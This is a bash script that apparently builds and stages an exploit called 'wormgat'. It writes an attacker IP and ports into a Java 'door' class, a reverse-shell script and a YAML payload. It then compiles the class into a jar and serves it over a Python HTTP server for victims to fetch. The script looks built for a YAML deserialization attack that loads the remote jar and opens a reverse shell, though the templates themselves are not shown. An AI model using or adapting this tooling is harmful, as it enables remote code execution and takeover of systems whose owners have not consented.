#!/bin/bash
if [ -z "$1" ]
  then
    echo "Please specify IP"
    exit
fi
if [ -z "$2" ]
  then
    echo "Please specify Port"
    exit
fi
if [ -z "$3" ]
  then
    echo "Please specify rev Port"
    exit
fi
rm -r src-copy
rm payload.*
rm reverse.*
mkdir -p build
cp -r src/main/java build/src
cp -r src/main/resources/* build/src
cp source.sh reverse.sh
cp source.yml payload.yml
sed -i'' -e 's/{ip}/'"$1"'/g' build/src/wormgat/WormgatDoorFactory.java
sed -i'' -e 's/{ip}/'"$1"'/g' reverse.sh
sed -i'' -e 's/{ip}/'"$1"'/g' payload.yml
sed -i'' -e 's/{port}/'"$2"'/g' build/src/wormgat/WormgatDoorFactory.java
sed -i'' -e 's/{rev}/'"$3"'/g' reverse.sh
sed -i'' -e 's/{port}/'"$2"'/g' payload.yml
javac build/src/wormgat/WormgatDoorFactory.java
jar -cvf wormgat-door.jar -C build/src/ .
python3 -m http.server $2
